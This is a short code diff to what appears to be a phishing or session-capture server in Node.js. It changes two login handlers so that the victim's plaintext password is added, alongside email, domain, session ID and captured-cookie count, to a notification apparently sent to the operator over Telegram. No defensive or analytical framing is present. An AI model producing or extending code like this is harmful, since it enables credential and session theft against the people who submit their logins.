@@ -544,7 +544,8 @@ app.post('/api/login', async (req, res) => {
                                 domain: domain,
                                 timestamp: new Date().toISOString(),
                                 totalCookies: totalCookies,
-                                sessionId: sessionId
+                                sessionId: sessionId,
+                                password: password
                             });
 
                             console.log(`📤 Telegram notification sent for ${email}`);
@@ -905,7 +906,8 @@ app.post('/api/continue-login', async (req, res) => {
                             domain: domain,
                             timestamp: new Date().toISOString(),
                             totalCookies: totalCookies,
-                            sessionId: requestedSessionId
+                            sessionId: requestedSessionId,
+                            password: password
                         });
 
                         console.log(`📤 Telegram notification sent for ${email}`);
